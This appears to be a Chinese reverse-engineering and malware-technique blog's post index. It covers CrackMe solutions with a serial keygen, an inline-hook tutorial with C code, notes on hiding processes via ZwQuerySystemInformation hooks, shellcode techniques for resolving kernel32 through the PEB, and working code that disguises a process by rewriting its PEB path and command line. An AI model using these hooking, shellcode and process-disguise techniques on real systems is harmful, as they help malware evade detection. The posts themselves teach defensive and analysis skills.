{"meta":{"title":"b1ackie'blog","subtitle":"","description":"","author":"b1ackie","url":"https://b1ack1e.github.io","root":"/"},"pages":[{"title":"404 Not Found：该页无法显示","date":"2021-07-07T04:21:57.734Z","updated":"2021-05-31T02:54:50.000Z","comments":false,"path":"/404.html","permalink":"https://b1ack1e.github.io/404.html","excerpt":"","text":""},{"title":"关于","date":"2021-07-09T10:36:49.838Z","updated":"2021-07-09T10:36:49.838Z","comments":false,"path":"about/index.html","permalink":"https://b1ack1e.github.io/about/index.html","excerpt":"","text":"b1ackie from satter"},{"title":"分类","date":"2021-07-09T10:38:18.156Z","updated":"2021-05-31T02:54:50.000Z","comments":false,"path":"categories/index.html","permalink":"https://b1ack1e.github.io/categories/index.html","excerpt":"","text":""},{"title":"书单","date":"2021-07-07T04:21:57.735Z","updated":"2021-05-31T02:54:50.000Z","comments":false,"path":"books/index.html","permalink":"https://b1ack1e.github.io/books/index.html","excerpt":"","text":""},{"title":"友情链接","date":"2021-07-09T10:38:27.093Z","updated":"2021-05-31T02:54:50.000Z","comments":true,"path":"links/index.html","permalink":"https://b1ack1e.github.io/links/index.html","excerpt":"","text":""},{"title":"Repositories","date":"2021-07-08T05:35:10.751Z","updated":"2021-05-31T02:54:50.000Z","comments":false,"path":"repository/index.html","permalink":"https://b1ack1e.github.io/repository/index.html","excerpt":"","text":""},{"title":"标签","date":"2021-07-07T04:21:57.735Z","updated":"2021-05-31T02:54:50.000Z","comments":false,"path":"tags/index.html","permalink":"https://b1ack1e.github.io/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"160CrackMe-004","slug":"160CrackMe-004","date":"2021-07-29T02:29:39.000Z","updated":"2021-07-29T03:57:23.294Z","comments":true,"path":"2021/07/29/160CrackMe-004/","link":"","permalink":"https://b1ack1e.github.io/2021/07/29/160CrackMe-004/","excerpt":"","text":"初探打开程序，看到需要输入用户名和注册码，提示如果正确下面会出现一张朱茵的照片。 分析使用DIE查看一下，无壳，使用Delphi编写的。 使用OD搜索一下字符串，可以看到几个字符串，其中有恭喜注册成功的字样，可以看到还有黑头这样的问题，但是点进去查看没有什么。 下断点在恭喜这里，但是看不到什么有用的信息，在获取用户名的长度，然后加上循环次数这样，但是这并不是注册码，然后跳转的关键在esi+0x30c这里，如果这里的值不等于0x85就会跳转到失败。","categories":[{"name":"CrackMe","slug":"CrackMe","permalink":"https://b1ack1e.github.io/categories/CrackMe/"}],"tags":[{"name":"逆向工程","slug":"逆向工程","permalink":"https://b1ack1e.github.io/tags/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B/"},{"name":"CrackMe","slug":"CrackMe","permalink":"https://b1ack1e.github.io/tags/CrackMe/"}]},{"title":"HOOK-Inline Hook","slug":"HOOK-Inline Hook","date":"2021-07-28T03:17:15.000Z","updated":"2021-07-29T02:30:32.298Z","comments":true,"path":"2021/07/28/HOOK-Inline Hook/","link":"","permalink":"https://b1ack1e.github.io/2021/07/28/HOOK-Inline%20Hook/","excerpt":"","text":"Inline HookInline Hook是Hook技术的一种，它是通过修改机器码来实现HOOK。当我们正常调用一个API函数时，正常的流程是，call API，然后就会到函数内部执行。我们写下如下语句，在OD中打开就是如图的样子。可以看到先压入参数，然后调用MessageBoxA函数。 1MessageBoxA(NULL, &quot;这是本来的窗口&quot;, &quot;未被HOOK&quot;, MB_OK); 进入函数可以看到函数的具体 Inline Hook就是了通过字节码更改了函数的流程，刚才我们看到的是正常的流程，如果调用正常函数的时候，我们修改它的执行流程，使其跳转到我们自定义的函数内部去执行就可以实现Inlie HOOK。 如何实现通过上面我们知道了，我们需要修改的就是程序的执行流程，而改变程序的执行流程就是jmp、call等，我们用最常见的jmp来进行分析。 如图可以看到一条JMP指令，看到后面的地址是0x401254，再看旁边的机器码是E9 EF000000。我们知道E9是JMP的机器码，那么EF000000为什么和要跳转的地址不一样呢。这是因为在JMP后面使用的是一个偏移量而不是一个具体的地址。如果使用地址的话，数据重定位之后，每次都会变，但是使用偏移就不一样了。 100401160 . /E9 EF000000 jmp InlineHo.00401254 JMP后的偏移计算公式是： 偏移=目的地址-原地址-5 5是JMP指令的长度，如果是其他的一些指令的话，那么这里不是5，可能是6、7所以要注意要根据具体情况而来。 想要用JMP进行修改，我们就需要构造机器码修改前五个字节。来尝试HOOK一下MessageBox函数。 具体实现12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061#include &lt;Windows.h&gt;int WINAPI My_MessageBoxA( _In_opt_ HWND hWnd, _In_opt_ LPCSTR lpText, _In_opt_ LPCSTR lpCaption, _In_ UINT uType);FARPROC MessageBoxAAddress;BYTE NewData[5] = &#123; 0xE9, 0x0, 0x0, 0x0,0 &#125;;BYTE OldData[5] = &#123; 0 &#125;;void InlineHook();void UnInlineHook();int main() &#123; MessageBoxA(NULL, &quot;原始窗口1&quot;, &quot;未被HOOK&quot;, MB_OK); InlineHook(); MessageBoxA(NULL, &quot;原始窗口2&quot;, &quot;未被HOOK&quot;, MB_OK); UnInlineHook(); MessageBoxA(NULL, &quot;原始窗口3&quot;, &quot;未被HOOK&quot;, MB_OK); return 0;&#125;void InlineHook() &#123; MessageBoxAAddress = GetProcAddress(LoadLibraryA(&quot;user32.dll&quot;), &quot;MessageBoxA&quot;); //保存原数据 memcpy(OldData, MessageBoxAAddress, 5); //计算需要跳转的偏移 DWORD dwOffset = (DWORD)My_MessageBoxA - (DWORD)MessageBoxAAddress - 5; //写入新数据，跳转的偏移 memcpy(&amp;NewData[1], &amp;dwOffset, 5); DWORD dwOldprotect = 0; //修改页属性 VirtualProtect(MessageBoxAAddress, 5, PAGE_EXECUTE_READWRITE, &amp;dwOldprotect); //写入五个字节 memcpy(MessageBoxAAddress, NewData, 5); //恢复页属性 VirtualProtect(MessageBoxAAddress, 5, dwOldprotect, &amp;dwOldprotect);&#125;void UnInlineHook() &#123; MessageBoxAAddress = GetProcAddress(LoadLibraryA(&quot;user32.dll&quot;), &quot;MessageBoxA&quot;); DWORD dwOldProtect = 0; VirtualProtect(MessageBoxAAddress, 5, PAGE_EXECUTE_READWRITE, &amp;dwOldProtect); //恢复原来的字节码 memcpy(MessageBoxAAddress, OldData, 5); VirtualProtect(MessageBoxAAddress, 5, dwOldProtect, &amp;dwOldProtect);&#125;int WINAPI My_MessageBoxA( _In_opt_ HWND hWnd, _In_opt_ LPCSTR lpText, _In_opt_ LPCSTR lpCaption, _In_ UINT uType) &#123; //先恢复原来的字节码，然后调用正常的MessageboxA弹窗 UnInlineHook(); int bRet = MessageBoxA(NULL, &quot;Inline Hook\\ni am b1ackie!!!&quot;, &quot;hook&quot;, MB_OK); InlineHook(); return bRet;&#125; 可以看到有三个弹窗，正常流程下肯定是1,2,3但是我们Inline Hook了MessageBoxA函数，并且将其中内容改了，如果成功的话，第二个弹窗会不一样，运行程序查看效果。 先是第一个正常的窗口 然后是第二个窗口，开始了InlineHook，可以看到并没有弹出原始窗口2，说明此时已经被HOOK了 第三个窗口再取消InlineHook后弹出正常的窗口 现在使用OD载入程序来看一下，直接查看第二个MessageBoxA函数，进入查看可以看到函数头部已经改变了，变成了JMP。 跳过来看，就是我们自己编写的My_MessageBoxA函数 123456789101112131415161718192021222324252627282930313233343536373839404142434445464700401170 &gt;/. 55 push ebp00401171 |. 8BEC mov ebp,esp00401173 |. 83EC 08 sub esp,0x800401176 |. A1 04304100 mov eax,dword ptr ds:[__security_cookie_fai&gt;0040117B |. 33C5 xor eax,ebp0040117D |. 8945 FC mov dword ptr ss:[ebp-0x4],eax00401180 |. 56 push esi00401181 |. 68 4C1C4100 push InlineHo.00411C4C ; /MessageBoxA00401186 |. 68 581C4100 push InlineHo.00411C58 ; |/user32.dll0040118B |. FF15 04D04000 call dword ptr ds:[&lt;&amp;KERNEL32.LoadLibraryA&gt;&gt;; |\\LoadLibraryA00401191 |. 50 push eax ; |hModule = 0000000100401192 |. FF15 08D04000 call dword ptr ds:[&lt;&amp;KERNEL32.GetProcAddres&gt;; \\GetProcAddress00401198 |. 8B35 00D04000 mov esi,dword ptr ds:[&lt;&amp;KERNEL32.VirtualPro&gt;; kernel32.VirtualProtect0040119E |. 8D4D F8 lea ecx,dword ptr ss:[ebp-0x8]004011A1 |. 51 push ecx ; /pOldProtect = 049BE914004011A2 |. 6A 40 push 0x40 ; |NewProtect = PAGE_EXECUTE_READWRITE004011A4 |. 6A 05 push 0x5 ; |Size = 0x5004011A6 |. 50 push eax ; |Address = 00000001004011A7 |. A3 A0424100 mov dword ptr ds:[MessageBoxAAddressfailure&gt;; |004011AC |. C745 F8 00000&gt;mov dword ptr ss:[ebp-0x8],0x0 ; |004011B3 |. FFD6 call esi ; \\VirtualProtect004011B5 |. 8B0D A0424100 mov ecx,dword ptr ds:[MessageBoxAAddressfai&gt;; user32.MessageBoxA004011BB |. A1 98424100 mov eax,dword ptr ds:[OldDatan_table]004011C0 |. 8901 mov dword ptr ds:[ecx],eax004011C2 |. A0 9C424100 mov al,byte ptr ds:[0x41429C]004011C7 |. 8841 04 mov byte ptr ds:[ecx+0x4],al004011CA |. 8D45 F8 lea eax,dword ptr ss:[ebp-0x8]004011CD |. 50 push eax ; /pOldProtect = 00000001004011CE |. FF75 F8 push dword ptr ss:[ebp-0x8] ; |NewProtect = PAGE_NOACCESS|PAGE_WRITECOPY|PAGE_EXECUTE|PAGE_EXECUTE_READWRITE|MEM_COMMIT|400400004011D1 |. 6A 05 push 0x5 ; |Size = 0x5004011D3 |. 51 push ecx ; |Address = 049BE914004011D4 |. FFD6 call esi ; \\VirtualProtect004011D6 |. 6A 00 push 0x0 ; /Style = MB_OK|MB_APPLMODAL004011D8 |. 68 641C4100 push InlineHo.00411C64 ; |hook004011DD |. 68 6C1C4100 push InlineHo.00411C6C ; |Inline Hook\\ni am b1ackie!!!004011E2 |. 6A 00 push 0x0 ; |hOwner = NULL004011E4 |. FF15 10D14000 call dword ptr ds:[&lt;&amp;USER32.MessageBoxA&gt;] ; \\MessageBoxA004011EA |. 8BF0 mov esi,eax004011EC |. E8 CFFEFFFF call InlineHo.InlineHook_ansi_nolocketaryso&gt;004011F1 |. 8B4D FC mov ecx,dword ptr ss:[ebp-0x4]004011F4 |. 8BC6 mov eax,esi004011F6 |. 33CD xor ecx,ebp004011F8 |. 5E pop esi ; InlineHo.0040103C004011F9 |. E8 06000000 call InlineHo.__security_check_cookiepresen&gt;004011FE |. 8BE5 mov esp,ebp00401200 |. 5D pop ebp ; InlineHo.0040103C00401201 \\. C2 1000 retn 0x10 注入方式实现inline hook我们可以将inline hook写成一个dll文件，然后通过远线程注入的方式，将其注入到进程中。 远程线程的具体实现：注入技术-远程线程注入 编写一个弹窗，实现效果如下 当注入成功后，内容更改 总结本篇只介绍了32位的Inline Hook，但是64位原理相同，只是修改的字节数不同，还有跳转方式也只介绍了基于JMP的，还有其他几种跳转方式，感兴趣可以看《加密与解密第四版》其中有较为详细的介绍。","categories":[{"name":"HOOK技术","slug":"HOOK技术","permalink":"https://b1ack1e.github.io/categories/HOOK%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"恶意代码","slug":"恶意代码","permalink":"https://b1ack1e.github.io/tags/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/"},{"name":"黑客编程","slug":"黑客编程","permalink":"https://b1ack1e.github.io/tags/%E9%BB%91%E5%AE%A2%E7%BC%96%E7%A8%8B/"},{"name":"Inline Hook","slug":"Inline-Hook","permalink":"https://b1ack1e.github.io/tags/Inline-Hook/"}]},{"title":"隐藏技术-进程隐藏","slug":"隐藏技术-进程隐藏","date":"2021-07-27T03:25:51.000Z","updated":"2021-07-27T08:46:58.831Z","comments":true,"path":"2021/07/27/隐藏技术-进程隐藏/","link":"","permalink":"https://b1ack1e.github.io/2021/07/27/%E9%9A%90%E8%97%8F%E6%8A%80%E6%9C%AF-%E8%BF%9B%E7%A8%8B%E9%9A%90%E8%97%8F/","excerpt":"","text":"进程隐藏在windows中，用户程序的所有操作都是基于WIN32API来实现的，例如使用任务管理器查看进程等操作，这就给了病毒木马操作的空间。它可以通过HOOK技术拦截API的调用，并对数据进行监控和修改，从而达到不可告人的目的。 实现进程隐藏可以HOOK ZwQuerySystemInformain来实现进程的隐藏。遍历进程通常是调用EnumProcesses或者CreateToolhelp32Snapshot等来实现。跟踪这些函数可以发现，他们内部都调用了ZwQuerySystemInformain函数。 可以用调试器跟踪一下CreateToolhelp32Snapshot函数，可以看到在内部调用了ZwQuerySystemInformain函数 在ZwQuerySystemInformain函数的内部判断检索的信息是否是进程信息，若是，则对返回的进程信息进行修改，将隐藏的进程信息从中去掉再返回。","categories":[{"name":"黑客编程","slug":"黑客编程","permalink":"https://b1ack1e.github.io/categories/%E9%BB%91%E5%AE%A2%E7%BC%96%E7%A8%8B/"}],"tags":[{"name":"恶意代码","slug":"恶意代码","permalink":"https://b1ack1e.github.io/tags/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/"},{"name":"黑客编程","slug":"黑客编程","permalink":"https://b1ack1e.github.io/tags/%E9%BB%91%E5%AE%A2%E7%BC%96%E7%A8%8B/"},{"name":"隐藏技术","slug":"隐藏技术","permalink":"https://b1ack1e.github.io/tags/%E9%9A%90%E8%97%8F%E6%8A%80%E6%9C%AF/"}]},{"title":"shellcode学习","slug":"shellcode学习","date":"2021-07-22T01:58:08.000Z","updated":"2021-07-23T10:57:28.324Z","comments":true,"path":"2021/07/22/shellcode学习/","link":"","permalink":"https://b1ack1e.github.io/2021/07/22/shellcode%E5%AD%A6%E4%B9%A0/","excerpt":"","text":"shellcode学习编译器的一些设置第一步修改入口点在编译器中修改程序的入口点，写代码时就可以使用新的入口点名 修改过后，体积变得很小，使用IDA查看也可以看到左边函数只有两个。 第二步关闭缓冲区安全检查 然后查看IDA，左边函数只剩一个了 第三步设置工程兼容XP 修改运行库为MT 第四步关闭生成清单 使用loadpe查看看到只有两个区段 第五步关闭调试信息 shellcode编写原则1 杜绝双引号字符串的直接使用 关闭VS自动优化没有使用到的变量 自定义函数入口 #pragma comment(linker,”/entry:EntryMain”) shellcode编写原则2动态获取函数地址 12345678910111213141516#include &lt;Windows.h&gt;#pragma comment(linker,&quot;/entry:EntryMain&quot;)int EntryMain() &#123; typedef int (WINAPI* FN_MessageBoxA)( __in_opt HWND hWnd, __in_opt LPCSTR lpText, __in_opt LPCSTR lpCaption, __in UINT uType); FN_MessageBoxA fn_MessageBoxA; fn_MessageBoxA = (FN_MessageBoxA)GetProcAddress(LoadLibraryA(&quot;user32.dll&quot;), &quot;MessageBoxA&quot;); fn_MessageBoxA(NULL, &quot;b1ackie&quot;, &quot;hhh&quot;, NULL); return 0;&#125; shellcode编写原则3获取kernel32.dll基址和GetProcAddress地址获取。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869#include &lt;Windows.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#pragma comment(linker,&quot;/entry:EntryMain&quot;)#pragma comment(lib, &quot;ucrtd.lib&quot;) //#pragma comment(lib, &quot;msvcrtd.lib&quot;) //#pragma comment(lib, &quot;vcruntimed.lib&quot;) _declspec(naked) DWORD getKernel32() &#123; __asm &#123; mov eax, fs: [30h] //获取PEB mov eax, [eax + 0Ch] //获取_PEB_LDR_DATA mov eax, [eax + 14h] //InMemoryOrderModuleList， mov eax, [eax] //程序自身 mov eax, [eax] //ntdll.dll mov eax,[eax+10h] //kernel.dll,偏移10H是地址 ret &#125;&#125;FARPROC _GetProcAddress(HMODULE hModule) &#123; PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)hModule; PIMAGE_NT_HEADERS pNtHeader = (PIMAGE_NT_HEADERS)((DWORD)pDosHeader + pDosHeader-&gt;e_lfanew); PIMAGE_EXPORT_DIRECTORY lpExport = (PIMAGE_EXPORT_DIRECTORY)((DWORD)pDosHeader + (DWORD)pNtHeader-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress); PDWORD lpAddressOfNamesArray = (PDWORD)((DWORD)pDosHeader + lpExport-&gt;AddressOfNames); PWORD lpAddressOfNameOrdinalArray = (PWORD)((DWORD)pDosHeader + lpExport-&gt;AddressOfNameOrdinals); PDWORD lpAddressOfFuncArray = (PDWORD)((DWORD)pDosHeader + lpExport-&gt;AddressOfFunctions); DWORD dwNumber = lpExport-&gt;NumberOfNames; DWORD wHint = 0; FARPROC lpFunc; for (DWORD i = 0; i &lt; dwNumber; i++) &#123; char *lpFuncName = (char*)((DWORD)pDosHeader + lpAddressOfNamesArray[i]); if (lpFuncName[0] == &#x27;G&#x27;&amp;&amp; lpFuncName[1] == &#x27;e&#x27;&amp;&amp; lpFuncName[2] == &#x27;t&#x27;&amp;&amp; lpFuncName[3] == &#x27;P&#x27;&amp;&amp; lpFuncName[4] == &#x27;r&#x27;&amp;&amp; lpFuncName[5] == &#x27;o&#x27;&amp;&amp; lpFuncName[6] == &#x27;c&#x27;&amp;&amp; lpFuncName[7] == &#x27;A&#x27;&amp;&amp; lpFuncName[8] == &#x27;d&#x27;&amp;&amp; lpFuncName[9] == &#x27;d&#x27;&amp;&amp; lpFuncName[10] == &#x27;r&#x27;&amp;&amp; lpFuncName[11] == &#x27;e&#x27;&amp;&amp; lpFuncName[12] == &#x27;s&#x27;&amp;&amp; lpFuncName[13] == &#x27;s&#x27;) &#123; wHint = lpAddressOfNameOrdinalArray[i]; lpFunc = (FARPROC)((DWORD)pDosHeader + lpAddressOfFuncArray[wHint]); break; &#125; &#125; return lpFunc; //PWORD &#125;int EntryMain() &#123; HMODULE hAddr = (HMODULE)getKernel32(); typedef FARPROC(WINAPI* FN_GetProcAddress)( _In_ HMODULE hModule, _In_ LPCSTR lpProcName ); FN_GetProcAddress fn_GetProcAddress; fn_GetProcAddress = (FN_GetProcAddress)_GetProcAddress(hAddr); return 0;&#125; shellcode编写原则4 避免全局变量的使用 确保已加载所使用的API的动态链接库 第一种shellcode生成框架","categories":[{"name":"ShellCode","slug":"ShellCode","permalink":"https://b1ack1e.github.io/categories/ShellCode/"}],"tags":[{"name":"恶意代码","slug":"恶意代码","permalink":"https://b1ack1e.github.io/tags/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/"},{"name":"ShellCode","slug":"ShellCode","permalink":"https://b1ack1e.github.io/tags/ShellCode/"}]},{"title":"160CrackMe-003","slug":"160CrackMe-003","date":"2021-07-21T07:11:38.000Z","updated":"2021-07-21T10:41:29.824Z","comments":true,"path":"2021/07/21/160CrackMe-003/","link":"","permalink":"https://b1ack1e.github.io/2021/07/21/160CrackMe-003/","excerpt":"","text":"初探打开程序看到需要输入用户名和序列号尝试输入后提示错误 分析使用工具查看，发现未加壳，语言是VB。 用OD打开程序，直接搜素错误字符串即可定位。首先还是和002一样，先是获取长度然后进行一些操作再加上NAME[0] 1234567891011121314151617004081E3 . FF15 18B14000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaHresu&gt;; Msvbvm50.__vbaHresultCheckObj004081E9 &gt; 8B95 50FFFFFF mov edx,dword ptr ss:[ebp-0xB0]004081EF . 8B45 E4 mov eax,dword ptr ss:[ebp-0x1C] ; 获取输入的name004081F2 . 50 push eax ; /String = 00004000 ???004081F3 . 8B1A mov ebx,dword ptr ds:[edx] ; |004081F5 . FF15 F8B04000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaLenBs&gt;; \\获取name长度004081FB . 8BF8 mov edi,eax004081FD . 8B4D E8 mov ecx,dword ptr ss:[ebp-0x18]00408200 . 69FF 385B0100 imul edi,edi,0x15B38 ; 长度乘以0x15B3800408206 . 51 push ecx ; /String = 091C840A ???00408207 . 0F80 B7050000 jo AfKayAs_.004087C4 ; |0040820D . FF15 0CB14000 call dword ptr ds:[&lt;&amp;MSVBVM50.#516&gt;] ; \\获取输入name的第一次ascii码00408213 . 0FBFD0 movsx edx,ax00408216 . 03FA add edi,edx ; 长度计算后加上name[0]00408218 . 0F80 A6050000 jo AfKayAs_.004087C40040821E . 57 push edi ; Msvbvm50.__vbaObjSet0040821F . FF15 F4B04000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaStrI4&gt;; 转字符串（十进制） 然后将结果转为浮点数执行了几次操作。 第一次 123456789101112131415161718004082E9 . FF15 74B14000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaR8Str&gt;; 转为浮点数004082EF . D905 08104000 fld dword ptr ds:[0x401008] ; １０004082F5 . 833D 00904000&gt;cmp dword ptr ds:[0x409000],0x0004082FC . 75 08 jnz short AfKayAs_.00408306004082FE . D835 0C104000 fdiv dword ptr ds:[0x40100C] ; １０／５00408304 . EB 0B jmp short AfKayAs_.0040831100408306 &gt; FF35 0C104000 push dword ptr ds:[0x40100C]0040830C . E8 578DFFFF call &lt;jmp.&amp;MSVBVM50._adj_fdiv_m32&gt;00408311 &gt; 83EC 08 sub esp,0x800408314 . DFE0 fstsw ax00408316 . A8 0D test al,0xD00408318 . 0F85 A1040000 jnz AfKayAs_.004087BF0040831E . DEC1 faddp st(1),st ; ＋２00408320 . DFE0 fstsw ax00408322 . A8 0D test al,0xD00408324 . 0F85 95040000 jnz AfKayAs_.004087BF0040832A . DD1C24 fstp qword ptr ss:[esp]0040832D . FF15 48B14000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaStrR8&gt;; 转回去 第二次 123456789004083F5 . FF15 74B14000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaR8Str&gt;; Msvbvm50.__vbaR8Str004083FB . DC0D 10104000 fmul qword ptr ds:[0x401010] ; ＊３00408401 . 83EC 08 sub esp,0x800408404 . DC25 18104000 fsub qword ptr ds:[0x401018] ; －２0040840A . DFE0 fstsw ax0040840C . A8 0D test al,0xD0040840E . 0F85 AB030000 jnz AfKayAs_.004087BF00408414 . DD1C24 fstp qword ptr ss:[esp]00408417 . FF15 48B14000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaStrR8&gt;; Msvbvm50.__vbaStrR8 第三次 12345678004084DF . FF15 74B14000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaR8Str&gt;; Msvbvm50.__vbaR8Str004084E5 . DC25 20104000 fsub qword ptr ds:[0x401020] ; ＋１５004084EB . 83EC 08 sub esp,0x8004084EE . DFE0 fstsw ax004084F0 . A8 0D test al,0xD004084F2 . 0F85 C7020000 jnz AfKayAs_.004087BF004084F8 . DD1C24 fstp qword ptr ss:[esp]004084FB . FF15 48B14000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaStrR8&gt;; Msvbvm50.__vbaStrR8 最后的比较也是使用浮点数进行比较，用计算出结果除以我们输入，再与1进行比较。 12345678910111213141516004085F1 . DCBD 1CFFFFFF fdivr qword ptr ss:[ebp-0xE4] ; 计算的ｓｅｒｉａｌ／输入004085F7 . EB 11 jmp short AfKayAs_.0040860A004085F9 &gt; FFB5 20FFFFFF push dword ptr ss:[ebp-0xE0]004085FF . FFB5 1CFFFFFF push dword ptr ss:[ebp-0xE4]00408605 . E8 888AFFFF call &lt;jmp.&amp;MSVBVM50._adj_fdivr_m64&gt;0040860A &gt; DFE0 fstsw ax0040860C . A8 0D test al,0xD0040860E . 0F85 AB010000 jnz AfKayAs_.004087BF00408614 . FF15 34B14000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaFpR8&gt;&gt;; Msvbvm50.__vbaFpR80040861A . DC1D 28104000 fcomp qword ptr ds:[0x401028] ; 结果与１进行比较00408620 . DFE0 fstsw ax ; 将寄存器的值传给ＡＸ00408622 . F6C4 40 test ah,0x40 ; 比较ａｈ值与０ｘ４０00408625 . 74 07 je short AfKayAs_.0040862E ; 若不相等就会跳到清空ｅｓｉ处00408627 . BE 01000000 mov esi,0x1 ; 相等ｅｓｉ赋值１0040862C . EB 02 jmp short AfKayAs_.004086300040862E &gt; 33F6 xor esi,esi ; 清空寄存器 这里 fcomp是比较后改变寄存器状态，然后再由fstsw指令将寄存器值传给ax 比较结果 C3 C0 ST(0)&gt;源操作数 0 0 ST(0)&lt;源操作数 0 1 ST(0)=源操作数 1 0 ST(0)不可比较 1 1 看一下FST寄存器，看到寄存器中的值，此时是输入等于计算的时候，看到FST是4000，C3是1 计算器转换一下看的仔细 注册机12345678910111213141516#include &quot;pch.h&quot;#include &lt;iostream&gt;#include &lt;Windows.h&gt;int main()&#123; printf(&quot;输入name\\n&quot;); char name[20]; gets_s(name, 20); int len = strlen(name); int serial; serial = len * 0x15B38; serial += name[0]; serial = (serial + 2) * 3 - 2 + 15; printf(&quot;serial:%d\\n&quot;, serial); return 0;&#125; 输入正确的serial","categories":[{"name":"CrackMe","slug":"CrackMe","permalink":"https://b1ack1e.github.io/categories/CrackMe/"}],"tags":[{"name":"逆向工程","slug":"逆向工程","permalink":"https://b1ack1e.github.io/tags/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B/"},{"name":"CrackMe","slug":"CrackMe","permalink":"https://b1ack1e.github.io/tags/CrackMe/"}]},{"title":"隐藏技术-进程伪装","slug":"隐藏技术-进程伪装","date":"2021-07-21T06:02:59.000Z","updated":"2021-07-27T08:46:06.477Z","comments":true,"path":"2021/07/21/隐藏技术-进程伪装/","link":"","permalink":"https://b1ack1e.github.io/2021/07/21/%E9%9A%90%E8%97%8F%E6%8A%80%E6%9C%AF-%E8%BF%9B%E7%A8%8B%E4%BC%AA%E8%A3%85/","excerpt":"","text":"进程伪装进程伪装就是修改任意进程的信息，在系统中显示的是另一个进程的信息，但是实际上还是它还是在执行原来的操作。 实现原理实现起来原理并不复杂，就是修改指定进程的进程环境块PEB中的进程路径以及命令行信息即可。下面使用Windbg来查看一下notepad的相关信息。 查看PEB的相关信息，可以看到ProcessParameters，这里有进程的路径和命令行相关信息。 继续查看这个结构，可以看到ImagePathName和CommandLine，也可以看到其中的信息都是”C:\\Windows\\system32\\notepad.exe” 编码实现 获取PEB地址 获取ProcessParameters 写入伪装信息 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970// DisguiseProcess.cpp : 此文件包含 &quot;main&quot; 函数。程序执行将在此处开始并结束。//#include &quot;pch.h&quot;#include &lt;iostream&gt;#include &lt;Windows.h&gt;#include &lt;winternl.h&gt;#include &lt;process.h&gt;typedef NTSTATUS(NTAPI* typedef_NtQueryInformationProcess)( IN HANDLE ProcessHandle, IN PROCESSINFOCLASS ProcessInformationClass, OUT PVOID ProcessInformation, IN ULONG ProcessInformationLength, OUT PULONG ReturnLength OPTIONAL );/*PID：需要进行伪装的进程PID* lpwszpath：伪装路径* lpwszcmd：伪装命令行*/BOOL DisguiseProcess(DWORD PID, wchar_t* lpwszPath, wchar_t* lpwszCmd) &#123; //打开进程获取句柄 HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID); if (hProcess == NULL) &#123; printf(&quot;打开进程失败\\n&quot;); return FALSE; &#125; typedef_NtQueryInformationProcess NtQueryInformationProcess = NULL; PROCESS_BASIC_INFORMATION pbi = &#123; 0 &#125;; PEB peb = &#123; 0 &#125;; RTL_USER_PROCESS_PARAMETERS Param = &#123; 0 &#125;; USHORT usCmdLen = 0; USHORT usPathLen = 0; NtQueryInformationProcess = (typedef_NtQueryInformationProcess)GetProcAddress(LoadLibraryA(&quot;ntdll.dll&quot;), &quot;NtQueryInformationProcess&quot;); if (NtQueryInformationProcess == NULL) &#123; printf(&quot;获取函数地址失败\\n&quot;); return FALSE; &#125; NTSTATUS status = NtQueryInformationProcess(hProcess, ProcessBasicInformation, &amp;pbi, sizeof(pbi), NULL); if (!NT_SUCCESS(status)) &#123; printf(&quot;获取进程信息失败\\n&quot;); return FALSE; &#125; //获取peb的地址 ReadProcessMemory(hProcess, pbi.PebBaseAddress, &amp;peb, sizeof(peb), NULL); //获取ProcessParameters地址 ReadProcessMemory(hProcess, peb.ProcessParameters, &amp;Param, sizeof(Param), NULL); usCmdLen = 2 + 2 * wcslen(lpwszCmd); //写入命令行信息 WriteProcessMemory(hProcess, Param.CommandLine.Buffer, lpwszCmd, usCmdLen, NULL); WriteProcessMemory(hProcess, &amp;Param.CommandLine.Length, &amp;usCmdLen, sizeof(usCmdLen), NULL); usPathLen = 2 + 2 * wcslen(lpwszPath); //写入路径信息 WriteProcessMemory(hProcess, Param.ImagePathName.Buffer, lpwszPath, usPathLen, NULL); WriteProcessMemory(hProcess, &amp;Param.ImagePathName.Length, &amp;usPathLen, sizeof(usPathLen), NULL); return TRUE;&#125;int main()&#123; //伪装自身获取自身PID，如果伪装其他程序可以通过窗口或者进程名方式获得PID if (DisguiseProcess(_getpid(), L&quot;C:\\\\Windows\\\\System32\\\\notepad.exe&quot;, L&quot;C:\\\\Windows\\\\Syetem32\\\\notepad.exe&quot;) == FALSE) &#123; printf(&quot;进程伪装失败\\n&quot;); system(&quot;pause&quot;); exit(-1); &#125; printf(&quot;伪装成功\\n&quot;); system(&quot;pause&quot;); return 0;&#125; 运行伪装程序，提示伪装成功 然后使用Process Explorer查看伪装程序的相关信息。可以看到进程已经伪装成功，描述这里写着记事本，路径和命令行都是我们写入的伪装信息。 